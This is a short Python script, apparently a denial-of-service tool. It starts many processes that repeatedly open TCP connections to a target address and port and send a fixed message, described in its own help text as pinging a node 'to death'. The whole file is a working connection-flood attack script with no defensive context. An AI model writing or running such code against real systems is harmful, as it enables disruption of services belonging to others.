import argparse
import socket
from multiprocessing import Process, Value
from time import sleep


def ping_ponger(address, port, number, q):
    print("Thread #{} is set up and running".format(number))
    counter = 0
    while q.value == 0:
        counter += 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((address, port))
        s.send(int(1).to_bytes(4, byteorder='big'))
        s.send(bytes("They are the panzer elite, born to complete, never retreat - Ghost Division!", 'ASCII'))
        s.close()



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ping-pong given node to death")
    parser.add_argument("-a", type=str, help="target node address")
    parser.add_argument("-p", type=int, help="target node port")
    parser.add_argument("-n", type=int, help="number of threads")
    parser = parser.parse_args()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    thread_list = []
    num = Value('d', 0.0)
    for x in range(parser.n):
        thread_list.append(Process(target=ping_ponger, args=(parser.a, parser.p, x, num)))
        thread_list[x].start()
    sleep(1)
    input("Press any key to end this misery")
    num.value = 1
